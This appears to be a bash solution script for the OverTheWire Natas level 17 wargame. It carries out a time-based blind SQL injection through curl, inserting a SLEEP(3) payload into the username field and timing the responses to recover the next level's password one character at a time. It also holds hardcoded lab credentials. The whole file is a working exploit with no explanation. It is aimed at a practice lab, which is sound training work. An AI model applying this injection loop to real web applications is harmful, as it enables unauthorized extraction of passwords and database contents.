#BashTime-BasedSQL
#!/bin/bash


auth="natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
url="http://natas17.natas.labs.overthewire.org/"
password=""

for pos in {1..40}
do
    for char in {A..Z} {a..z} {0..9}
    do
        echo "Char: $char Pos: $pos"
        if(curl \
        -u "$auth" \
        -d "username=natas18\" AND BINARY substring(password,1,$pos)= BINARY '$password$char' AND SLEEP(3) AND \"1\"=\"1" \
        $url \
        -o /dev/null \
        -s \
        -w "time_total=%{time_total}\n" | grep "time_total=3.*")

        then
            password=$password$char
            echo "Exist password: $password Pos: $pos"
            break
        fi
            
    done
done
echo "Password: $password"